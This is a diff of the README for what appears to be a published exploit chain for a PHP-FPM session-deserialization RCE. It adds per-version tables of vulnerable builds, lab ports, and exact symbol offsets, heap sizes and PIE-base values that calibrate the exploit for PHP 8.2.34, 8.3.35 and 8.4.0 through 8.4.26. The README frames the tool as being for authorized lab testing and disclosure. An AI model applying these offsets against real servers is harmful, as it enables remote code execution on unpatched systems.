@@ -17,7 +17,8 @@ no Docker, no root.
 > **Authorized security testing only.** Use this only on systems you own or
 > have explicit written permission to test. The chain sends large bodies,
 > triggers OOM conditions, and kills PHP-FPM workers. Run it against disposable
-> local laboratories. See [LICENSE](LICENSE).
+> local laboratories. See [LICENSE](LICENSE) and [SECURITY.md](SECURITY.md)
+> (support matrix, reporting, disclosure timeline).
 
 **Keywords:** PHP-FPM RCE, nginx PHP-FPM exploit, CVE-2026-109619, PHP 8.2,
 PHP 8.3, PHP 8.4, PHP 8.4.27, session deserialization, `BG(unserialize)`, stale pointer,
@@ -85,6 +86,18 @@ memsets `BG(unserialize)`:
 matrix: `is_vulnerable()`, `fixed_in()`, `affected_versions()`, and
 `source_is_fixed()` (which classifies a tarball by the presence of the fix
 marker instead of trusting a version string).
+
+<!-- coverage:start -->
+Coverage generated from `profiles/*-fpm.json`, `profiles/verification.json` and the version registry:
+
+| Status | Versions |
+| --- | --- |
+| RCE over HTTP only | `8.2.34`, `8.3.35`, `8.4.0`-`8.4.26` |
+| Session-file plant (pre-auth write) | `5.4.45`, `5.5.38`, `5.6.40`, `7.2.34`, `7.4.33`, `8.0.30`, `8.1.33` |
+| Patched upstream (cannot RCE) | `8.2.35`, `8.3.36`, `8.4.27`, `8.5.12` |
+| Out of scope | `5.0`-`5.3` (no `session.upload_progress`), `8.5.x` (not calibrated) |
+
+<!-- coverage:end -->
 
 | Item | Value |
 | --- | --- |
@@ -343,16 +356,10 @@ uid=1000(cryptocalypse) gid=1000(cryptocalypse) groups=...
 The same commands work on every shipped profile; only the symbol offsets and
 the heap geometry differ (see [Profile and offsets](#profile-and-offsets)).
 
-`make matrix` verifies the whole unpatched set in one run:
-
-```text
-7.2.34    SESSION PLANT      pre-auth write into sess_<sid>
-7.4.33    SESSION PLANT      pre-auth write into sess_<sid>
-8.2.34    REMOTE RCE         uid=1000(cryptocalypse) ...
-8.3.35    REMOTE RCE         uid=1000(cryptocalypse) ...
-8.4.25    REMOTE RCE         uid=1000(cryptocalypse) ...
-8.4.26    REMOTE RCE         uid=1000(cryptocalypse) ...
-```
+`make matrix` re-verifies one representative per branch over HTTP and records
+the verdicts in `profiles/verification.json`; the
+[coverage table](#affected-builds) in this README is generated from those
+verdicts plus the shipped profiles, so it cannot drift from reality.
 
 The `502` is expected: the worker dies after executing the command and FPM
 respawns it. Do not treat `502` as a failed exploit; check the proof file.
@@ -363,8 +370,13 @@ The lab uses one nginx front and two PHP-FPM pools per build:
 
 | Build | chain HTTP | builder HTTP | chain FPM | builder FPM |
 | --- | --- | --- | --- | --- |
+| 5.4.45 | :8648 | :8649 | :9548 | :9549 |
+| 5.5.38 | :8726 | :8727 | :9626 | :9627 |
+| 5.6.40 | :8808 | :8809 | :9708 | :9709 |
 | 7.2.34 | :8268 | :8269 | :9168 | :9169 |
 | 7.4.33 | :8336 | :8337 | :9236 | :9237 |
+| 8.0.30 | :8870 | :8871 | :9770 | :9771 |
+| 8.1.33 | :8938 | :8939 | :9838 | :9839 |
 | 8.2.34 | :8406 | :8407 | :9306 | :9307 |
 | 8.3.35 | :8478 | :8479 | :9378 | :9379 |
 | 8.4.0 | :8480 | :8481 | :9380 | :9381 |
@@ -390,20 +402,41 @@ All ports bind to `127.0.0.1`. The proof directory
 ## Profile and offsets
 
 <!-- profile-table:start -->
-Every shipped profile is `verified: true` / `rce: true` and was produced by the automatic `calibrate` run against a live build:
+Every shipped profile is `verified: true` / `rce: true`, produced by the automatic `calibrate` run against a live build:
 
-| Field | 8.2.34 | 8.3.35 | 8.4.0 | 8.4.1 | 8.4.25 | 8.4.26 |
-| --- | --- | --- | --- | --- | --- | --- |
-| zif_system | `0x3769d0` | `0x37d5f0` | `0x384380` | `0x384380` | `0x386460` | `0x386660` |
-| zval_ptr_dtor | `0x439120` | `0x446460` | `0x542dd0` | `0x542e50` | `0x549890` | `0x54a0d0` |
-| basic_globals | `0xa15220` | `0xa14e80` | `0xa04580` | `0xa04580` | `0xa04660` | `0xa04660` |
-| BG data / level offset | `848` / `856` | `856` / `864` | `872` / `880` | `872` / `880` | `872` / `880` | `872` / `880` |
-| `reclaim_size` | `16384` | `16384` | `16384` | `16384` | `12288` | `12288` |
-| `no_oracle` candidate | `0x80000`+`0xfe8` | `0x80000`+`0xfe8` | `0x7f000`+`0xfe8` | `0x7f000`+`0xfe8` | `0x7f000`+`0xfe8` | `0x7f000`+`0xfe8` |
-| chunk base offset | `0x8c000` | `0x8c000` | `0x8b000` | `0x8b000` | `0x8b000` | `0x8b000` |
-| PIE base offset | `0x4a2c85` | `0x4b24f6` | `0x4e4467` | `0x4e44e7` | `0x4e9fc7` | `0x4ea787` |
+| Version | zif_system | zval_ptr_dtor | basic_globals | BG offs | reclaim | no_oracle | chunk base | PIE base |
+| --- | --- | --- | --- | --- | --- | --- | --- | --- |
+| 8.2.34 | `0x3769d0` | `0x439120` | `0xa15220` | 848/856 | [4096, 4096] x 16384 | 0x80000+0xfe8 | `0x8c000` | `0x4a2c85` |
+| 8.3.35 | `0x37d5f0` | `0x446460` | `0xa14e80` | 856/864 | [4096, 4096] x 16384 | 0x80000+0xfe8 | `0x8c000` | `0x4b24f6` |
+| 8.4.0 | `0x384380` | `0x542dd0` | `0xa04580` | 872/880 | [4096, 4096] x 16384 | 0x7f000+0xfe8 | `0x8b000` | `0x4e4467` |
+| 8.4.1 | `0x384380` | `0x542e50` | `0xa04580` | 872/880 | [4096, 4096] x 16384 | 0x7f000+0xfe8 | `0x8b000` | `0x4e44e7` |
+| 8.4.2 | `0x384340` | `0x542f90` | `0xa04580` | 872/880 | [4096, 4096] x 16384 | 0x7f000+0xfe8 | `0x8b000` | `0x4e4627` |
+| 8.4.3 | `0x384570` | `0x543f10` | `0xa04580` | 872/880 | [4096, 4096] x 16384 | 0x7f000+0xfe8 | `0x8b000` | `0x4e55a7` |
+| 8.4.4 | `0x384bb0` | `0x544990` | `0xa04580` | 872/880 | [4096, 4096] x 16384 | 0x7f000+0xfe8 | `0x8b000` | `0x4e5f67` |
+| 8.4.5 | `0x384e70` | `0x545350` | `0xa04580` | 872/880 | [4096, 4096] x 16384 | 0x7f000+0xfe8 | `0x8b000` | `0x4e6927` |
+| 8.4.6 | `0x384fb0` | `0x5456d0` | `0xa04580` | 872/880 | [4096, 4096] x 16384 | 0x7f000+0xfe8 | `0x8b000` | `0x4e6aa7` |
+| 8.4.7 | `0x384f70` | `0x545910` | `0xa04580` | 872/880 | [4096, 4096] x 16384 | 0x7f000+0xfe8 | `0x8b000` | `0x4e6aa7` |
+| 8.4.8 | `0x384f30` | `0x545890` | `0xa04580` | 872/880 | [4096, 4096] x 16384 | 0x7f000+0xfe8 | `0x8b000` | `0x4e6a07` |
+| 8.4.9 | `0x384e70` | `0x545b10` | `0xa04580` | 872/880 | [4096, 4096] x 16384 | 0x7f000+0xfe8 | `0x8b000` | `0x4e6c47` |
+| 8.4.10 | `0x384e70` | `0x545ad0` | `0xa04580` | 872/880 | [4096, 4096] x 16384 | 0x7f000+0xfe8 | `0x8b000` | `0x4e6c07` |
+| 8.4.11 | `0x384ff0` | `0x545d50` | `0xa04660` | 872/880 | [4096, 4096] x 16384 | 0x7f000+0xfe8 | `0x8b000` | `0x4e6e47` |
+| 8.4.12 | `0x384f30` | `0x546150` | `0xa04660` | 872/880 | [4096, 4096] x 16384 | 0x7f000+0xfe8 | `0x8b000` | `0x4e7007` |
+| 8.4.13 | `0x384f70` | `0x546250` | `0xa04660` | 872/880 | [4096, 4096] x 16384 | 0x7f000+0xfe8 | `0x8b000` | `0x4e7107` |
+| 8.4.14 | `0x384f30` | `0x546510` | `0xa04660` | 872/880 | [4096, 4096] x 16384 | 0x7f000+0xfe8 | `0x8b000` | `0x4e7387` |
+| 8.4.15 | `0x384f30` | `0x546550` | `0xa04660` | 872/880 | [4096, 4096] x 16384 | 0x7f000+0xfe8 | `0x8b000` | `0x4e7307` |
+| 8.4.16 | `0x3852a0` | `0x546c10` | `0xa04660` | 872/880 | [4096, 4096] x 16384 | 0x7f000+0xfe8 | `0x8b000` | `0x4e7947` |
+| 8.4.17 | `0x385320` | `0x546fd0` | `0xa04660` | 872/880 | [4096, 4096] x 16384 | 0x7f000+0xfe8 | `0x8b000` | `0x4e7bc7` |
+| 8.4.18 | `0x385320` | `0x547310` | `0xa04660` | 872/880 | [4096, 4096] x 16384 | 0x7f000+0xfe8 | `0x8b000` | `0x4e7cc7` |
+| 8.4.19 | `0x3852e0` | `0x5474d0` | `0xa04660` | 872/880 | [4096, 4096] x 16384 | 0x7f000+0xfe8 | `0x8b000` | `0x4e7e87` |
+| 8.4.20 | `0x3854a0` | `0x547e90` | `0xa04660` | 872/880 | [4096, 4096] x 16384 | 0x7f000+0xfe8 | `0x8b000` | `0x4e87c7` |
+| 8.4.21 | `0x385360` | `0x548490` | `0xa04660` | 872/880 | [4096, 4096] x 16384 | 0x7f000+0xfe8 | `0x8b000` | `0x4e8c87` |
+| 8.4.22 | `0x3854e0` | `0x548610` | `0xa04660` | 872/880 | [4096, 4096] x 16384 | 0x7f000+0xfe8 | `0x8b000` | `0x4e8e07` |
+| 8.4.23 | `0x3852a0` | `0x548450` | `0xa04660` | 872/880 | [4096, 4096] x 16384 | 0x7f000+0xfe8 | `0x8b000` | `0x4e8b87` |
+| 8.4.24 | `0x385f20` | `0x5490d0` | `0xa04660` | 872/880 | [4096, 4096] x 16384 | 0x7f000+0xfe8 | `0x8b000` | `0x4e9807` |
+| 8.4.25 | `0x386460` | `0x549890` | `0xa04660` | 872/880 | [4096, 4096] x 12288 | 0x7f000+0xfe8 | `0x8b000` | `0x4e9fc7` |
+| 8.4.26 | `0x386660` | `0x54a0d0` | `0xa04660` | 872/880 | [4096, 4096] x 12288 | 0x7f000+0xfe8 | `0x8b000` | `0x4ea787` |
 
-Identical on every build: struct_size `8216`, reclaim_pads `[4096, 4096]`, leak arm `/bigvar.php`, leak pads `[32768, 16384]`, forged header `0x17e8`, read length `0x15810`, chunk pointer offset `0x77f8`, PIE pointer offset `0x157e8`.
+Identical on every build: struct_size `8216`, leak arm `/bigvar.php`, leak pads `[32768, 16384]`, forged header `0x17e8`, read length `0x15810`, chunk pointer offset `0x77f8`, PIE pointer offset `0x157e8`.
 
 <!-- profile-table:end -->
 
